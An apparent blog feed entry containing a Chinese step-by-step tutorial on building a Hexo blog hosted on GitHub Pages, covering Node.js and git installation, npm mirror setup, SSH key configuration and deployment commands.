    <content type="html"><![CDATA[<h1 id="Node-js"><a href="#Node-js" class="headerlink" title="Node.js"></a>Node.js</h1><p>下载：<a href="https://nodejs.org/en/">https://nodejs.org/en/</a> ，安装一路next就行，验证是否安装成功</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-keyword">node</span> <span class="hljs-title">-v</span><br></code></pre></td></tr></table></figure><h1 id="git"><a href="#git" class="headerlink" title="git"></a>git</h1><p>下载：<a href="https://git-scm.com/download/win">https://git-scm.com/download/win</a> ，安装一路next，验证是否安装成功</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">git <span class="hljs-comment">--version</span><br></code></pre></td></tr></table></figure><h1 id="注册github及创建仓库"><a href="#注册github及创建仓库" class="headerlink" title="注册github及创建仓库"></a>注册github及创建仓库</h1><p>在<code>Repository name</code>填上之后用来访问的域名，格式为<code>xxx.github.io</code>，然后创建</p><p><img src="/img/blogimg/image-20230620134715015.png"></p><p>创建完后会有一个HTTP链接，在仓库首页也能找到，将这个链接复制下来备用</p><p><img src="/img/blogimg/image-20230620135019889.png"></p><h1 id="安装HEXO"><a href="#安装HEXO" class="headerlink" title="安装HEXO"></a>安装HEXO</h1><p>在本地新建一个空目录来存放博客相关的文件，进入这个目录，右键单击<code>Git Bash Here</code>，进入git的命令行(Windows的命令行可能会有问题，统一用git的)</p><p><img src="/img/blogimg/image-20230620135210032.png"></p><p>因为是从国外服务器下载，所以我们配置一下连接国内淘宝官方的服务器</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript"><span class="hljs-built_in">npm</span> install -g cnpm --registry=https://registry.<span class="hljs-built_in">npm</span>.taobao.org<br>之后再次使用命令则是以cnpm开头，而不是<span class="hljs-built_in">npm</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">cnpm install -g hexo-cli<br><span class="hljs-comment"># 初始化</span><br>hexo init<br><span class="hljs-comment"># 启动HEXO，可以在http://127.0.0.1:4000/看到一篇样例博客</span><br>hexo s<br><span class="hljs-comment"># 关闭HEXO</span><br>ctrl + c<br></code></pre></td></tr></table></figure><p><img src="/img/blogimg/image-20230620135654170.png"></p><h1 id="配置SSH免密登录"><a href="#配置SSH免密登录" class="headerlink" title="配置SSH免密登录"></a>配置SSH免密登录</h1><p>在<code>C:\Users\用户名</code>文件夹下右键打开<code>Git Bash Here</code>输入命令：<code>ssh-keygen -t rsa -C github邮件地址</code> ，输入后连敲三次回车生成.ssh秘钥。</p><p>之后会生成一个新的<code>C:\Users\用户名\.ssh</code>文件夹，打开这个文件夹，找到<code>.ssh\id_rsa.pub</code>文件，记事本打开并复制里面的内容。</p><p>打开github主页，进入个人设置 -&gt; SSH and GPG keys -&gt; New SSH key，把复制的内容粘贴进去，title随便填，保存即可，设置好的界面：</p><p><img src="/img/blogimg/image-20230620140108396.png"></p><p>检测是否设置成功(在git bash输入)：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ssh</span> -T git<span class="hljs-variable">@github</span>.com<br></code></pre></td></tr></table></figure><p><img src="/img/blogimg/image-20230620140228351.png"></p><p>然后再输入：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">git config <span class="hljs-attr">--global</span> user<span class="hljs-selector-class">.name</span> <span class="hljs-string">&quot;xxx&quot;</span><span class="hljs-comment">// 你的github用户名，非昵称</span><br>git config <span class="hljs-attr">--global</span> user<span class="hljs-selector-class">.email</span>  <span class="hljs-string">&quot;xxx@qq.com&quot;</span><span class="hljs-comment">// 填写你的github注册邮箱</span><br></code></pre></td></tr></table></figure><h1 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h1><p>修改当时创建的空文件夹内的<code>_config.yml</code>文件</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dts">在文件的末尾修改(repository属性的地址就是之前创建仓库后所保存的http地址)<br><span class="hljs-symbol">deploy:</span><br><span class="hljs-symbol">type:</span> git<br><span class="hljs-symbol">repository:</span> https:<span class="hljs-comment">//github.com/xxx</span><br><span class="hljs-symbol">branch:</span> master<br></code></pre></td></tr></table></figure><p>安装hexo-deployer-git插件</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">cnpm install hexo-deployer-git <span class="hljs-comment">--save</span><br></code></pre></td></tr></table></figure><p>新建一篇测试文章，文章默认生成在<code>\blog\source\_posts</code>下面</p><figure class="highlight plaintext"><figcaption><span>new “文章名称”</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs hexo">hexo new “文章名称”<br></code></pre></td></tr></table></figure><p>将文章同步到github上去</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">hexo clean</span><br><span class="hljs-attribute">hexo g</span><br><span class="hljs-attribute">hexo d</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">博客搭建教程</summary>
    
    
    
    <category term="博客搭建" scheme="https://cvbxy.github.io/categories/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
    
    
    <category term="Hexo" scheme="https://cvbxy.github.io/tags/Hexo/"/>
    
    <category term="Fluid" scheme="https://cvbxy.github.io/tags/Fluid/"/>
    
  </entry>
  
</feed>
